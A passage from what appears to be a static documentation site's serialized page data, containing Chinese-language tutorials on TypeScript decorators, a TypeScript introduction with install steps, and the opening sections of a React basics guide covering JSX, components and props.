}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n上面就是装饰器的例子，打印顺序是1 3 4 2，f()和g()返回的函数会为c这个类作修饰。\n\n\n# 对类装饰\n\n对类使用装饰器，可以用来监视或修改类定义。在装饰器表达式里，类以构造函数形式作为其唯一的参数。装饰器表达式不返回值时，一般就是简单地往原型上添加内容；而如果是返回一个值，该值就是个匿名类并且会继承以前的类，也就是说匿名类会覆盖原类的同名属性和方法（包括constructor方法）。\n\n在ts中构造函数形式可以是new(...args: any[]) => {}，也可以是{ new(...args: any[]): {} }，当然最简单的是function。具体在装饰器中使用构造函数形时，传入的具体类型各不相同，那么有必要使用泛型，也就是t extends new(...args: any[]) => {}。\n\n// constructor是个构造函数（其实就是greeter），但不清楚具体类型得用泛型（不然ts静态检查过不了）\nfunction classdecorator<t extends new (...args: any[]) => {}>(constructor: t) {\n    // 返回这个class会以继承的方式覆盖原类的方法和属性（主要影响同名的，不同名的就相当于新加内容）\n    return class extends constructor {\n        public newproperty = \"new property\";\n        public hello = \"override\";\n    }\n}\n\n@classdecorator\nclass greeter {\n    public property = \"property\";\n    public hello: string;\n    constructor(m: string) {\n        this.hello = m;\n    }\n}\nconsole.log(new greeter(\"world\"));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n上面输出的结果{ property: 'property', hello: 'override', newproperty: 'new property' }，可能你会意外hello的值为什么是override而不是world，其实你需要补充一下es6的类知识了。在继承的派生类里没有明写constructor()方法时，其实是隐藏调用了。比如上面的代码其实是下面这样一个形式：\n\n// 部分代码，其他一样的省略\nreturn class extends constructor {\n    public newproperty = \"new property\";\n    public hello = \"override\";\n    constructor(...args: any[]) {\n        super(...args);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n你再根据这段代码加上前面所说的装饰器修饰类时的规则就能明白hello为什么是override，首先public hello = \"override\"覆盖原有的public hello: string，然后constructor(...args: any[])覆盖原有的constructor(m: string)，也就是说new greeter(\"world\")传进来的world是不会生效的。而如果改成下面的都就会生效（自己加上this.hello = args[0];）：\n\n// 部分代码，其他一样的省略\nreturn class extends constructor {\n    public newproperty = \"new property\";\n    public hello = \"override\";\n    constructor(...args: any[]) {\n        super(...args);\n        this.hello = args[0];\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 对方法装饰\n\n如果不需要对整个类进行装饰，可以考虑只对类的方法进行装饰。我们知道类里的方法，其实就是构造函数的原型上的方法（不理解的可以去看es6的类），那么对类的方法进行装饰，其实就是对原型对象的属性进行操作，是不是立马想到了object.defineproperty，这个方法是操作目标对象的属性以及属性的特性。对类的方法进行装饰也是一样的，请看：\n\nclass greeter {\n    greeting: string;\n    constructor(message: string) {\n        this.greeting = message;\n    }\n\n    @enumerable(false)\n    greet() {\n        return \"hello, \" + this.greeting;\n    }\n}\n// 对类的方法设置为不可枚举的\nfunction enumerable(value: boolean) {\n    // target是原型对象，propertykey是属性名，descriptor是特性，跟object.defineproperty类似\n    return function (target: any, propertykey: string, descriptor: propertydescriptor) {\n        descriptor.enumerable = value;\n    };\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 对访问器装饰\n\n只需要私有属性的访问器进行装饰，写法与方法装饰器类似，只是descriptor不一样而已。但是要注意不允许同时装饰一个成员的get和set访问器，因为descriptor同时有这两个访问器。\n\nclass point {\n    private _x: number;\n    private _y: number;\n    constructor(x: number, y: number) {\n        this._x = x;\n        this._y = y;\n    }\n\n    @configurable(false)\n    get x() { return this._x; }\n\n    @configurable(false)\n    get y() { return this._y; }\n}\nfunction configurable(value: boolean) {\n    // target是原型对象，propertykey是属性名，descriptor是特性，跟object.defineproperty类似\n    return function (target: any, propertykey: string, descriptor: propertydescriptor) {\n        descriptor.configurable = value;\n    };\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 对属性装饰\n\n我们知道普通方法和访问器都可以在原型对象上进行操作，但是类中的属性是属于实例化对象的（需要搞清楚es6的类），那么就不能像装饰方法一样使用原型对象上的属性的descriptor，而是自定义一个descriptor修改好后然后返回它，从而达到修改属性特性的目的。\n\nclass test {\n    @propdescriptor(false)\n    property: string = \"name\";\n}\nfunction propdescriptor(value: boolean) {\n    // target是原型对象，propertykey是属性名。注意，在target上不能操作实例属性\n    return function (target: any, propertykey: string): any {\n        const descriptor: propertydescriptor = { writable: value };\n        return descriptor;\n    };\n}\nconst test = new test();\ntest.property = \"test\"; // 报错，不能对只读的属性进行修改。这样就达到了目的\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 对参数装饰\n\n对类的构造方法或普通方法里的参数进行装饰，装饰器函数接收三个值，第一个是构造函数（方法是静态的）或者原型（普通方法），第二个是参数所在的方法名、第三个就是参数在参数列表中位置的索引。\n\nclass test {\n    func(name: string, @paramdescriptor(false) age: number) { }\n}\nfunction paramdescriptor(value: boolean) {\n    // target是构造函数（方法是静态的）或者原型（普通方法），propertykey是参数所在的方法名，descriptor是参数在参数列表中位置的索引\n    return function (target: any, method: string, index: number): any {\n        console.log('index', index);\n    };\n}\nconst test = new test();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 装饰器的小例子\n\n\nconst info: any = undefined;\nfunction catchdescriptor(msg: string) {\n    return function (target: any, propertykey: string, descriptor: propertydescriptor) {\n        const fun = descriptor.value;\n        // 用新函数包裹旧函数，并且统一做异常捕获处理\n        descriptor.value = function () {\n            try {\n                fun();\n            } catch (e) {\n                console.log(msg)\n            }\n        }\n    }\n}\nclass task {\n    @catchdescriptor('info.name不存在')\n    gettaskname() {\n        return info.name;\n    }\n    @catchdescriptor('info.id不存在')\n    gettaskid() {\n        return info.id;\n    }\n}\nconst task = new task();\ntask.gettaskid();\ntask.gettaskname();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n",charsets:{cjk:!0}},{title:"TypeScript简介",frontmatter:{},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0TypeScript/",relativePath:"book-web/html、css、js、ts/学习TypeScript/README.md",key:"v-5c5162cb",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0TypeScript/",headers:[{level:2,title:"TypeScript是什么",slug:"typescript是什么",normalizedTitle:"typescript是什么",charIndex:19},{level:2,title:"安装使用",slug:"安装使用",normalizedTitle:"安装使用",charIndex:355},{level:2,title:"内容",slug:"内容",normalizedTitle:"内容",charIndex:584}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"TypeScript是什么 安装使用 内容",content:"# TypeScript简介\n\n\n# TypeScript是什么\n\n2012年微软推出的开源、跨平台的编程语言——TypeScript，它是JavaScript的超集，添加了可选的静态类型和基于类的面向对象编程。\n\n因为JavaScript过于灵活，虽然前期开发速度快，但后期难以维护，特别是在大型项目中。所以就推出了TypeScript，使用它的静态类型系统可以在前期规划好变量、方法、类等所需要的类型，并且在后期维护中也会节省很多人力物力，把更多的精力放在业务逻辑上。\n\nTypeScript扩展了JavaScript的语法，只需要做一些小的调整，任何JavaScript的程序都可以直接放入TypeScript项目中，然后通过编译器将TypeScript编译成JavaScript就可以使用了。\n\n\n# 安装使用\n\n * 先保证自己的环境上有node和npm，在前面讲过了。\n * 打开命令行工具，输入npm install -g typescript全局安装TypeScript\n * 然后在本地写一个xxx.ts，再使用tsc xxx.ts来编译这个ts文件，会生成一个同名但是是.js结尾的js文件。\n * 执行 node xxx.js，在node上运行它了。\n * 可以安装ts-node然后直接使用ts-node xxx.ts来运行ts文件。\n\n\n# 内容\n\n * typescript基础\n   * 静态类型的理解\n   * 基础和复杂类型\n   * 类型注解和类型推断\n   * 函数\n   * 数组和元组\n   * 接口\n     * 接口约束对象\n     * 接口的实现与继承\n     * 接口约束函数\n     * 接口约束数组\n   * 类\n   * 联合类型和类型保护\n   * 枚举类型\n   * tsconfig.json\n * typescript进阶\n   * 泛型\n     * 泛型接口\n     * 泛型类\n     * 泛型函数\n     * 泛型约束\n     * 泛型中的keyof\n   * 命名空间\n     * 命名空间声明\n     * 命名空间使用\n     * 命名空间里再定义命名空间\n   * import\n     * 配合require.js使用\n     * 使用webpack打包\n   * 编写*.d.ts文件\n     * 声明全局函数\n     * 搭配使用interface\n     * 声明对象和类\n     * es6模块的声明文件\n   * 装饰器\n     * 对类装饰\n     * 对方法装饰\n     * 对访问器装饰\n     * 对属性装饰\n     * 对参数装饰\n     * 装饰器的小例子",normalizedContent:"# typescript简介\n\n\n# typescript是什么\n\n2012年微软推出的开源、跨平台的编程语言——typescript，它是javascript的超集，添加了可选的静态类型和基于类的面向对象编程。\n\n因为javascript过于灵活，虽然前期开发速度快，但后期难以维护，特别是在大型项目中。所以就推出了typescript，使用它的静态类型系统可以在前期规划好变量、方法、类等所需要的类型，并且在后期维护中也会节省很多人力物力，把更多的精力放在业务逻辑上。\n\ntypescript扩展了javascript的语法，只需要做一些小的调整，任何javascript的程序都可以直接放入typescript项目中，然后通过编译器将typescript编译成javascript就可以使用了。\n\n\n# 安装使用\n\n * 先保证自己的环境上有node和npm，在前面讲过了。\n * 打开命令行工具，输入npm install -g typescript全局安装typescript\n * 然后在本地写一个xxx.ts，再使用tsc xxx.ts来编译这个ts文件，会生成一个同名但是是.js结尾的js文件。\n * 执行 node xxx.js，在node上运行它了。\n * 可以安装ts-node然后直接使用ts-node xxx.ts来运行ts文件。\n\n\n# 内容\n\n * typescript基础\n   * 静态类型的理解\n   * 基础和复杂类型\n   * 类型注解和类型推断\n   * 函数\n   * 数组和元组\n   * 接口\n     * 接口约束对象\n     * 接口的实现与继承\n     * 接口约束函数\n     * 接口约束数组\n   * 类\n   * 联合类型和类型保护\n   * 枚举类型\n   * tsconfig.json\n * typescript进阶\n   * 泛型\n     * 泛型接口\n     * 泛型类\n     * 泛型函数\n     * 泛型约束\n     * 泛型中的keyof\n   * 命名空间\n     * 命名空间声明\n     * 命名空间使用\n     * 命名空间里再定义命名空间\n   * import\n     * 配合require.js使用\n     * 使用webpack打包\n   * 编写*.d.ts文件\n     * 声明全局函数\n     * 搭配使用interface\n     * 声明对象和类\n     * es6模块的声明文件\n   * 装饰器\n     * 对类装饰\n     * 对方法装饰\n     * 对访问器装饰\n     * 对属性装饰\n     * 对参数装饰\n     * 装饰器的小例子",charsets:{cjk:!0}},{title:"1.React基础",frontmatter:{title:"1.React基础"},regularPath:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0React/1.react%E5%9F%BA%E7%A1%80.html",relativePath:"book-web/web前端js框架/学习React/1.react基础.md",key:"v-a280a600",path:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0React/1.react%E5%9F%BA%E7%A1%80.html",headers:[{level:2,title:"一、jsx",slug:"一、jsx",normalizedTitle:"一、jsx",charIndex:14},{level:3,title:"1.1 什么是jsx",slug:"_1-1-什么是jsx",normalizedTitle:"1.1 什么是jsx",charIndex:24},{level:3,title:"1.2 jsx中的标签和属性",slug:"_1-2-jsx中的标签和属性",normalizedTitle:"1.2 jsx中的标签和属性",charIndex:874},{level:3,title:"1.3 jsx与表达式",slug:"_1-3-jsx与表达式",normalizedTitle:"1.3 jsx与表达式",charIndex:1452},{level:3,title:"1.4 jsx中的子元素",slug:"_1-4-jsx中的子元素",normalizedTitle:"1.4 jsx中的子元素",charIndex:2351},{level:3,title:"1.5 条件、列表渲染",slug:"_1-5-条件、列表渲染",normalizedTitle:"1.5 条件、列表渲染",charIndex:2897},{level:3,title:"1.6 渲染React元素",slug:"_1-6-渲染react元素",normalizedTitle:"1.6 渲染react元素",charIndex:4951},{level:2,title:"二、组件化开发",slug:"二、组件化开发",normalizedTitle:"二、组件化开发",charIndex:5758},{level:3,title:"2.1 组件化以及组件的结构",slug:"_2-1-组件化以及组件的结构",normalizedTitle:"2.1 组件化以及组件的结构",charIndex:5770},{level:3,title:"2.2 组件的props",slug:"_2-2-组件的props",normalizedTitle:"2.2 组件的props",charIndex:7887},{level:3,title:"2.3 组件的state",slug:"_2-3-组件的state",normalizedTitle:"2.3 组件的state",charIndex:11203},{level:3,title:"2.4 数据流是单向的",slug:"_2-4-数据流是单向的",normalizedTitle:"2.4 数据流是单向的",charIndex:13765},{level:3,title:"2.5 事件处理",slug:"_2-5-事件处理",normalizedTitle:"2.5 事件处理",charIndex:14210},{level:3,title:"2.6 组件的refs",slug:"_2-6-组件的refs",normalizedTitle:"2.6 组件的refs",charIndex:18081},{level:2,title:"四、key的作用/表单的使用",slug:"四、key的作用-表单的使用",normalizedTitle:"四、key的作用/表单的使用",charIndex:19970},{level:3,title:"4.1 key怎么用以及为什么用",slug:"_4-1-key怎么用以及为什么用",normalizedTitle:"4.1 key怎么用以及为什么用",charIndex:19989},{level:3,title:"4.2 表单",slug:"_4-2-表单",normalizedTitle:"4.2 表单",charIndex:22206},{level:2,title:"五、状态提升",slug:"五、状态提升",normalizedTitle:"五、状态提升",charIndex:24737},{level:2,title:"六、Context",slug:"六、context",normalizedTitle:"六、context",charIndex:27408},{level:2,title:"七、组件的生命周期",slug:"七、组件的生命周期",normalizedTitle:"七、组件的生命周期",charIndex:29654},{level:3,title:"constructor()和render()",slug:"constructor-和render",normalizedTitle:"constructor()和render()",charIndex:29872},{level:3,title:"componentDidMount()和componentWillUnmount()",slug:"componentdidmount-和componentwillunmount",normalizedTitle:"componentdidmount()和componentwillunmount()",charIndex:30224},{level:3,title:"componentDidUpdate()和getSnapshotBeforeUpdate()",slug:"componentdidupdate-和getsnapshotbeforeupdate",normalizedTitle:"componentdidupdate()和getsnapshotbeforeupdate()",charIndex:31298},{level:3,title:"shouldComponentUpdate()",slug:"shouldcomponentupdate",normalizedTitle:"shouldcomponentupdate()",charIndex:32636},{level:3,title:"getDerivedStateFromProps()",slug:"getderivedstatefromprops",normalizedTitle:"getderivedstatefromprops()",charIndex:32709},{level:3,title:"说说scrollHeight",slug:"说说scrollheight",normalizedTitle:"说说scrollheight",charIndex:38409},{level:2,title:"八、React中的CSS模块化",slug:"八、react中的css模块化",normalizedTitle:"八、react中的css模块化",charIndex:39614},{level:3,title:"8.1 原生css的问题",slug:"_8-1-原生css的问题",normalizedTitle:"8.1 原生css的问题",charIndex:39634},{level:3,title:"8.2 CSS模块化",slug:"_8-2-css模块化",normalizedTitle:"8.2 css模块化",charIndex:40047},{level:3,title:"8.3 CSS模块智能提示",slug:"_8-3-css模块智能提示",normalizedTitle:"8.3 css模块智能提示",charIndex:41277},{level:3,title:"8.4 用类似方式加载资源",slug:"_8-4-用类似方式加载资源",normalizedTitle:"8.4 用类似方式加载资源",charIndex:41812}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、jsx 1.1 什么是jsx 1.2 jsx中的标签和属性 1.3 jsx与表达式 1.4 jsx中的子元素 1.5 条件、列表渲染 1.6 渲染React元素 二、组件化开发 2.1 组件化以及组件的结构 2.2 组件的props 2.3 组件的state 2.4 数据流是单向的 2.5 事件处理 2.6 组件的refs 四、key的作用/表单的使用 4.1 key怎么用以及为什么用 4.2 表单 五、状态提升 六、Context 七、组件的生命周期 constructor()和render() componentDidMount()和componentWillUnmount() componentDidUpdate()和getSnapshotBeforeUpdate() shouldComponentUpdate() getDerivedStateFromProps() 说说scrollHeight 八、React中的CSS模块化 8.1 原生css的问题 8.2 CSS模块化 8.3 CSS模块智能提示 8.4 用类似方式加载资源",content:"# React基础\n\n\n# 一、jsx\n\n\n# 1.1 什么是jsx\n\nconst el = <h1 className=\"greet\">Hello world!</h1>;\n\n\n1\n\n\n看到上面这个赋值语句，你可能会奇怪它为什么不是字符串包裹的？其实它是React中一种规定写法——jsx。使用jsx写出来的元素既不是字符串也不是HTML元素，比如上面的h1相当于React.createElement('h1', {className: 'greet'}, 'Hello world!')，生成了React“元素”这样的一个对象。\n\n// 另一种写法。你可以console.log('el', el)看一下el是否是一个Object，它的属性要比真实DOM要少很多\nconst el = { type: 'h1', props: { className: 'greet', children: 'Hello world!' } };\n// 相当于React.createElement('h1', {className: 'greet'}, 'Hello world!')\n\n\n1\n2\n3\n\n\n可以看一下jsx多行的写法：\n\n// 多行建议加上()，避免遇到自动插入分号的陷阱\nconst el = (\n  <div>\n    <h1>Hello!</h1>\n    <h2>Good to see you here.</h2>\n  </div>\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n为什么要使用jsx？其实react并没有强制人们使用jsx，它建议使用这种新的写法。这种写法的好处就是它非常接近html的书写方式，两者差别不大这在下一节里会讲到，另一个好处就是它可以很容易地和js代码贴合在一起，比如后面会讲到的条件渲染等等。要实现函数式编程或者组件化编写页面，将UI视图表现和渲染逻辑放在一起是很好的办法，不然按照传统的写法html和js基本是要进行分离的。当然，放在一起后要对组件做到更合适的拆分，不然组件就会显得很臃肿。\n\n\n# 1.2 jsx中的标签和属性\n\n原生的html标签在jsx里还是原来的写法，但是在jsx里使用自定义组件时，这个组件的标签名要首字母大写。\n\n然后jsx属性跟html的属性不一样，使用首字母小写的驼峰命名法，比如className其实就是html中的class，tabIndex则是tabindex等等。还有jsx属性可以是表达式，使用{}来承载表达式。\n\n// App是自定义组件的引用，用<>括起来作为标签来使用，并且<App />是首字母大写\nReactDOM.render(<App />, document.getElementById('root'));\n// className和tabIndex要是首字母小写的驼峰命名\nconst el1 = <h1 className=\"greet\">Hello world!</h1>;\nconst el2 = <div tabIndex=\"0\"></div>;\n// jsx属性可以是表达式\nconst el3 = <img src={user.avatarUrl}></img>;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nPS：想要在文件中写jsx这种语法，必须引入React，即import React from 'react';。只有引入了React，在文件中的那些jsx标签才不会报错。\n\n\n# 1.3 jsx与表达式\n\n可以在jsx里嵌入变量引用、计算式、函数调用等这些表达式，具体是使用{}并在这个花括号里写上你想要的表达式。{}可以是标签的显示内容，也可以是标签属性上的值。\n\n// 嵌入变量引用\nconst str = 'world!';\nconst el1 = <h1>Hello {str}</h1>;\n// 嵌入函数调用\nconst user = { first: 'Harper', last: 'Perez' };\nfunction func(user) { return user.first + ' ' + user.last; }\nconst el2 = <h1>Hello {func()}</h1>;\n// src属性值\nconst el3 = <img src={user.avatarUrl}></img>;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n上面的一些例子是将jsx作为值赋给一个常量，其实它也可以被赋值给变量，也可以作为参数传入函数，也可以作为函数的返回值被return。\n\nfunction getGreeting(user) {\n    if (user) {\n        return <h1>Hello, {func(user)}!</h1>;\n    }\n    return <h1>Hello, Stranger.</h1>;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n{}的使用跟Vue的模板语法不一样，特别是在{}里写对象时，React就是{{a:'a',b:'b'}}这种，非常像Vue的{{}}，但在React里它表示一个具有属性a和b的字面量对象。比较常见的场景就是在jsx里写style样式。\n\nconst data = '你好';\n// {}里的{}是一个样式对象。样式对象的属性值要用引号引起来，属性名要首字母小写的驼峰写法。\nconst el = (\n  <span style={{color:'white', fontSize:'15px'}}>{data}</span>\n);\n\n\n1\n2\n3\n4\n5\n\n\n\n# 1.4 jsx中的子元素\n\njsx标签里没有子元素时，可以直接使用/>来闭合（xml语法）。如果有子元素，可以使用多个子元素。但是，最顶层的父元素只能有一个（和Vue模板语法一样只能有一个根节点）。\n\nconst el = (\n  <div>\n    <h1>Hello!</h1>\n    <h2>Good to see you here.</h2>\n  </div>\n  <h1>Hello!</h1> // 错误！！！只能有一个顶级父元素\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n但是有时候我们确实不想再多套一层标签，怎么办呢？可以使用<Fragment>来充当顶级父元素，最后渲染在页面时<Fragment>并不会显示在页面只会显示子元素的内容（Vue模板语法是<template>）。\n\nconst el = (\n    <Fragment>\n        <div>\n            <h1>Hello!</h1>\n            <h2>Good to see you here.</h2>\n        </div>\n        <h1>Hello!</h1>\n    <Fragment/>\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 1.5 条件、列表渲染\n\n我们可以根据不同的条件或者状态来选择渲染哪部分UI，也就是在组件返回出参前根据需要来选择返回什么样的jsx。\n\nrender() {\n  const isLoggedIn = this.state.isLoggedIn;\n  if (isLoggedIn) {\n    return <UserGreeting />;\n  }\n  return <GuestGreeting />;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n除了上面这种使用if来控制最后返回的jsx，我们也可以使用&&运算符来改变最后返回的jsx，要主要这是一个表达式得使用{}来承载。\n\nrender() {\n  const unreadMessages = this.state.unreadMessages;\n  // unreadMessages的长度决定h2是否显示\n  return (\n    <div>\n      <h1>Hello!</h1>\n      {unreadMessages.length > 0 &&\n        <h2>\n          You have {unreadMessages.length} unread messages.\n        </h2>\n      }\n    </div>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n除了if和&&以外，还比较常见的就是? :三元运算符了，同样也是表达式也是需要{}来承载的。\n\nrender() {\n  const isLoggedIn = this.state.isLoggedIn;\n  return (\n    <div>\n      {isLoggedIn\n        ? <LogoutButton onClick={this.handleLogoutClick} />\n        : <LoginButton onClick={this.handleLoginClick} />\n      }\n    </div>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n在极少数情况下，你可能希望能隐藏组件，即使它已经被其他组件渲染。若要完成此操作，你可以让 render 方法直接返回 null，而不进行任何渲染。\n\nrender() {\n  if (!this.state.warn) {\n    return null;\n  }\n  return (\n    <div className=\"warning\">\n      Warning!\n    </div>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n条件渲染在上面可以用if语句，可以用&&运算符，可以用三元运算符。而列表渲染，可以用for语句，也可以用map()等遍历函数（表达式）。\n\n// for语句提前处理\nrender() {\n  const array = ['张三', '李四', '王五'];\n  const newArr = [];\n  for (let i = 0; i < array.length; i ++) {\n      newArr.push(<li key={i}>{array[i]}</li>)\n  }\n  return (\n    <ul>\n        {newArr}\n    </ul>\n  );\n}\n// map的方式（表达式）\nrender() {\n  const array = ['张三', '李四', '王五'];\n  return (\n    <ul>\n        {\n          array.map((item, index) =>{\n              return <li key={index}>{item}</li>\n          })\n        }\n    </ul>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n以上示例就是jsx的灵活之处了，jsx外部可以用js语句处理好交给render函数里的jsx使用，像ul就会遍历数组（不会遍历对象），jsx内部的{}只能使用js表达式。Vue的模板语法里面就不能使用js语句（当然Vue是支持jsx的），模板语法来实现条件渲染和列表渲染一般是通过v-if和v-for这样的Vue内置指令，指令的值必须得是js表达式。\n\n说了这么多，你应该明白jsx和模板语法大概的相同和不同之处了吧，它们内部只能使用js表达式（三元运算、函数调用、变量赋值等），不同就是js语句可配合jsx使用，而模板语法不可以。jsx灵活贴近原生js，模板语法需要特殊指令但运行性能更好。\n\n\n# 1.6 渲染React元素\n\n在项目的显示入口文件index.html里有一个<div id=\"root\"></div>，这个就是根节点。React会通过ReactDOM.render()函数来管理挂载到根节点的React元素，并且会渲染这个React元素。\n\nconst element = <h1>Hello, world</h1>;\nReactDOM.render(element, document.getElementById('root'));\n\n\n1\n2\n\n\n但是React元素是不可变对象，它一旦被创建，就无法更改它的子元素或者属性。那么想改变UI的效果，必须创建一个全新的React元素再传入ReactDOM.render()。\n\n// 尽管每一秒我们都会新建一个描述整个 UI 树的元素，其实React DOM 只会更新实际改变了的内容。\nfunction tick() {\n    const element = (\n        <div>\n            <h1>Hello, world!</h1>\n            <h2>It is {new Date().toLocaleTimeString()}.</h2>\n        </div>\n    );\n    ReactDOM.render(element, document.getElementById('root'));\n}\nsetInterval(tick, 1000); // 每隔一秒会重新创建React元素并传到ReactDOM.render()里渲染\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n注意：一般ReactDOM.render()只会使用一次，尽量不要使用上面的这种方式来改变页面的显示。后面会学习state，可以使用setState()来触发组件进行重新渲染。\n\n\n# 二、组件化开发\n\n\n# 2.1 组件化以及组件的结构\n\n前端开发常用方式是对一个页面进行拆分，可以拆分成多个独立可复用的组件，组件之间可以是父子关系可以是兄弟关系也可以没有关系。\n\n组件在概念上类似于js的函数（入参props，出参是React元素），可以用es6的形式来使用它，即通过import和export来引入和使用。引入一个新组件并将其嵌入到自身组件的UI上，嵌入时是不会显式地实例化这个新组件（意思不会new Xx()而会<Xx />）。当然，组件也不会刻意去继承另一个组件（除了继承React.Component）。\n\nApp.jsx\n\nimport React from 'react';\n\nfunction App() {\n  return (\n    <div>Hello world!</div>\n  );\n}\n// 将自定义组件App导出去供别人使用\nexport default App;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nindex.jsx\n\nimport React from 'react';\nimport ReactDOM from 'react-dom';\nimport App from './App';\n// 导入App，并以<App />的形式使用（不要使用new App()的形式），自定义组件使用时必须首字母大写\nReactDOM.render(\n  <App />,\n  document.getElementById('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n组件的两种写法：\n\n// 第一种：函数组件，必须要return，一般返回的是一个jsx\nfunction Welcome() {\n    // 该函数组件里面的this一般是undefined\n    return <h1>Hello world!</h1>;\n}\n// 第二种：class组件(两种组件是等效的)，必须要有render函数，该函数必须return，一般返回的是一个jsx\nclass Welcome extends React.Component {\n    render() {\n        // 该类组件的render函数里面的this一般是本组件实例对象。这个对象使用调用者帮忙实例化的\n        return <h1>Hello world!</h1>;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n像前面的一些例子都是单纯返回一个React元素，其实组件内部还能写React元素对应的处理逻辑，也就是说组件内部包含了UI和处理逻辑，这是一种松散耦合的结构。下面这个例子可以先不看代码细节，只需看代码结构中有UI（render方法）和处理逻辑（事件处理）两部分。这样对开发人员在视觉上有较好的辅助作用。还有就是组件比较容易维护，组件可以复用在很多页面，也比较符合传统开发人员的开发习惯（函数式）。\n\n// Toggle组件\nclass Toggle extends React.Component {\n    constructor(props) {  // 父组件传递的数据props\n        super(props);\n        this.state = {isToggleOn: true}; // 组件内部数据state\n        this.handleClick = this.handleClick.bind(this); // 绑定this\n    }\n    // 本组件渲染内容（UI）\n    render() {\n        return (// 包裹()的原因是避免自动加;符号\n            // jsx语法，属性名onClick必须是首字母小写的驼峰写法\n            // 属性值是{表达式}形式，元素内容也是{表达式}形式\n            <button onClick={this.handleClick}>\n                {this.state.isToggleOn ? 'ON' : 'OFF'}\n            </button>\n        );\n    }\n    // 处理点击事件的逻辑\n    handleClick() {\n        // 改变state的值，setState的实参可以是对象也可以是函数，state就是原来的state\n        this.setState(state => ({\n            isToggleOn: !state.isToggleOn\n        }));\n    }\n}\nReactDOM.render(<Toggle />, document.getElementById('root'));\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 2.2 组件的props\n\n在上一小节里构造函数的入参使用了props，它就是当前组件的入参。用来接收调用处标签上的属性以及该标签的子元素。需要注意的是props是只读的，不允许被修改。\n\nindex.tsx\n\nimport React from 'react';\nimport ReactDOM from 'react-dom';\nimport App from './App';\n// 显示结果：Hello world!!!\nReactDOM.render(\n  <App str=\"Hello\">!!!</App>, // 调用处\n  document.getElementById('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nApp.tsx\n\nimport React, { Fragment, ReactElement } from 'react';\n// str是调用App时传入的属性，children是调用App时App的子元素也就是文本，其实子元素也可以是标签\nfunction App(props: { str: string, children: ReactElement | string }) {\n  return (\n    <Fragment>{props.str} world{props.children}</Fragment>\n  );\n}\n\nexport default App;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n上面的例子我们使用ts编写的，传进来的props对象必须与调用App时的属性和子元素对应，不然ts会报错。\n\n如果通过props传递的参数很多，例如xxa={params.xxa} xxb={params.xxb} xxc={params.xxc}，你是可以通过props将params这个对象传递过去，子组件那边使用就是props.params。其实可以通过{...params}批量传输参数，而子组件接收就不涉及到params这个名字，而直接是props.xxa、props.xxb、props.xxc。例子如下。\n\nconst person = {\n  name: '张三',\n  age: 18,\n}\nconst a = 'a'\n// 其实就是将name={person.name}和age={person.age}放到<App/>属性位置上了\nReactDOM.render(\n  <React.StrictMode>\n    <App {...person} a={a}/>\n  </React.StrictMode>,\n  document.getElementById('root')\n);\nfunction App(props) {\n  // 页面显示的是 张三18a\n  return (\n    <div className=\"App\">\n      <span>{props.name}</span>\n      <span>{props.age}</span>\n      <span>{props.a}</span>\n    </div>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n上面这种方式非常像js展开运算符（剩余运算符），可以看一下展开语法(Spread syntax)。展开运算符可以单独用在数组上，例如const arr=[1,2];console.log(...arr)，也可以搭配[]使用，例如const 